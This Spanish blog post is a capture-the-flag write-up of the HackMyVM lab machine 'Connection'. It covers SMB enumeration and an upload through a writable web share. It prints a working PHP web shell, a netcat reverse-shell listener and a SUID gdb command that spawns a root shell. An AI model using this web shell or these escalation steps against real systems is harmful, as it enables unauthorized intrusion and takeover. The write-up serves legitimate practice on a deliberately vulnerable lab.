---
layout: single
title: Connection - HackMyVM
excerpt: "En este Post vamos a estar resolviendo la maquina Connection de la plataforma de HackMyVM tendremos que aprovecharnos de que el servicio smb esta habilitado para poder subir un archivo .php y poder ganar acceso ala maquina para la escalada de privilegios abusaremos de un binario SUID para convertirnos en el usuario root"
toc: true
toc_label: "Contenido"
toc_icon: "fire"
date: 2023-04-22
classes: wide
header:
  teaser: /assets/images/hvm-writeup-connection/card2.png
  teaser_home_page: true
  icon: /assets/images/hackvm.webp
categories:
  - HackMyVM
  - infosec
tags:  
  - SMB Enumeration
  - Reverse SHELL
  - SUID privilege

---
<p align="center">
<img src="/assets/images/hvm-writeup-connection/card2.png">
</p>

```bash
❯ arp-scan -I ens33 --localnet --ignoredups | grep VMware
192.168.1.107	00:0c:29:a7:d0:3a	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.1.107
PING 192.168.1.107 (192.168.1.107) 56(84) bytes of data.
64 bytes from 192.168.1.107: icmp_seq=1 ttl=64 time=0.363 ms

--- 192.168.1.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.363/0.363/0.363/0.000 ms
❯ whichSystem.py 192.168.1.107

192.168.1.107 (ttl -> 64): Linux
```

## PortScan

```bash
# Nmap 7.93 scan initiated Sat Apr 22 13:56:25 2023 as: nmap -sCV -p22,80,139,445 -oN targeted 192.168.1.107
Nmap scan report for 192.168.1.107
Host is up (0.00039s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7e601b5f906a1ea40042944f4df22a1 (RSA)
|   256 fb1694df9389c7568584229ea0be7c95 (ECDSA)
|_  256 452efb8704ebd18b926f6aea5aa2a11c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:A7:D0:3A (VMware)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-04-22T19:56:40
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2023-04-22T15:56:40-04:00
```

## Enumeracion

Como el puerto `455` esta abierto que corresponde a `smb` podemos usar `crackmapexec` para obtener mas informacion

```bash
❯ crackmapexec smb 192.168.1.107
SMB         192.168.1.107   445    CONNECTION       [*] Windows 6.1 (name:CONNECTION) (domain:) (signing:False) (SMBv1:True)

```

Con la herramienta `smbmap` vamos a ver si podemos listar contenidos de la maquina 

```bash
❯ smbmap -H 192.168.1.107
[+] IP: 192.168.1.107:445	Name: 192.168.1.107                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	share                                             	READ ONLY	
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (Private Share for uploading files)

```

Y ahora vemos que hay un recurso `html` que lo mas seguro es lo que vemos en la pagina web 

```bash
❯ smbmap -H 192.168.1.107 -r share
[+] IP: 192.168.1.107:445	Name: 192.168.1.107                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	share                                             	READ ONLY	
	.\share\*
	dr--r--r--                0 Tue Sep 22 20:48:39 2020	.
	dr--r--r--                0 Tue Sep 22 20:48:39 2020	..
	dr--r--r--                0 Sat Apr 22 16:07:48 2023	html
``` 

Y bueno la pagina web no tiene gran cosa 

```bash
❯ whatweb http://192.168.1.107
http://192.168.1.107 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.107], Title[Apache2 Debian Default Page: It works]

```

![](/assets/images/hvm-writeup-connection/Web1.png)

Si volvemos a listar que hay dentro de ese recurso vemos que esta el `index.html` que bueno debe ser de la pagina web

```bash
❯ smbmap -H 192.168.1.107 -r share/html
[+] IP: 192.168.1.107:445	Name: 192.168.1.107                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	share                                             	READ ONLY	
	.\sharehtml\*
	dr--r--r--                0 Sat Apr 22 16:07:48 2023	.
	dr--r--r--                0 Tue Sep 22 20:48:39 2020	..
	fr--r--r--            10701 Tue Sep 22 20:48:45 2020	index.html
```  

Vamos a conectarnos al recurso para ver si podemos subir algun archivo

```bash
❯ smbclient //192.168.1.107/share/
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 22 20:48:39 2020
  ..                                  D        0  Tue Sep 22 20:48:39 2020
  html                                D        0  Sat Apr 22 16:07:48 2023

		7158264 blocks of size 1024. 5462412 blocks available
smb: \>
``` 

```bash
smb: \> cd html\
smb: \html\> dir
  .                                   D        0  Sat Apr 22 16:07:48 2023
  ..                                  D        0  Tue Sep 22 20:48:39 2020
  index.html                          N    10701  Tue Sep 22 20:48:45 2020
``` 

Ahora vamos a subir una archivo `.txt` para ver si podemos verlo en la web 

```bash
❯ catn test.txt
hola estoy dentro
``` 

Si subio 

```bash
smb: \html\> put test.txt
putting file test.txt as \html\test.txt (8.8 kb/s) (average 8.8 kb/s)
smb: \html\>
``` 

Y bueno podemos ver el contenido 

![](/assets/images/hvm-writeup-connection/Web2.png)

Ahora sabiendo esto podemos subir directamente un archivo `.php` para poder ganar acceso 

```bash
❯ catn pwned.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Ahora vamos a subirlo por `smb`

```bash
smb: \html\> put pwned.php
putting file pwned.php as \html\pwned.php (32.2 kb/s) (average 20.5 kb/s)
smb: \html\> 
```

Y funciona

![](/assets/images/hvm-writeup-connection/Web5.png) 

## Shell www-data

Ahora nos vamos a enviar una reverse shell 

![](/assets/images/hvm-writeup-connection/Web6.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.97] from (UNKNOWN) [192.168.1.107] 41332
bash: cannot set terminal process group (567): Inappropriate ioctl for device
bash: no job control in this shell
www-data@connection:/var/www/html$ 
```

Ahora para poder hacer `ctrl+c` haremos lo siguiente

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.97] from (UNKNOWN) [192.168.1.107] 41332
bash: cannot set terminal process group (567): Inappropriate ioctl for device
bash: no job control in this shell
www-data@connection:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@connection:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
``` 

```bash
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
```

Y listo 

```bash
www-data@connection:/var/www/html$ export TERM=xterm
www-data@connection:/var/www/html$ export SHELL=bash
www-data@connection:/var/www/html$ 

``` 

## User flag

En esta ubicacion puedes leer la flag

![](/assets/images/hvm-writeup-connection/Web9.png) 

## Escalada de Privilegios

Vemos el binario `gdb` que es `SUID` 

```bash
www-data@connection:/$ find \-perm -4000 2>/dev/null
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/su
./usr/bin/passwd
./usr/bin/gdb
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/mount
./usr/bin/gpasswd
www-data@connection:/$
``` 

Si vamos a [gtfobins](https://gtfobins.github.io/gtfobins/gdb/#suid) podemos ver como escalar privilegios abusando de el biarnio `gdb` es `SUID` 

```bash
www-data@connection:/$ ls -l /usr/bin/gdb
-rwsr-sr-x 1 root root 8008480 Oct 14  2019 /usr/bin/gdb
www-data@connection:/$ 
```

```bash
www-data@connection:/$ /usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
#
``` 

## Root flag 

```bash
# whoami
root
# cd /root
# ls
proof.txt
#
```
![](/assets/images/hvm-writeup-connection/Final.png)
